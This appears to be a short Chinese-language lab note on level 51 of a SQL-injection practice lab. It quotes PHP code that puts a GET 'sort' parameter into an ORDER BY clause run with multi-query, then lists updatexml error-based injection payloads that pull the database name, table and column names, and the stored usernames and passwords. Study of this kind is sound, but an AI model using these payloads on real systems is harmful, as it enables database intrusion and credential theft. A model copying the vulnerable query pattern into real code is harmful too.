---
title: less51
url: https://www.yuque.com/u29002979/ep2zrx/dxfeaflalzgqw6gy
---

```bash
$id=$_GET['sort'];	

$sql="SELECT * FROM users ORDER BY '$id'";
/* execute multi query */
if (mysqli_multi_query($con1, $sql)) 
```

此关与Less50的区别为闭合方式为单引号，字符型注入，同样存在堆叠注入

<a name="GxiDU"></a>

# 报错注入

```bash
查询数据库表
?sort=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +
爆破数据表
?sort=1' and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +
爆破字段名
?sort=1' and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) -- +
爆破字段
?sort=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users limit 0,1),0x7e),1) -- +
```
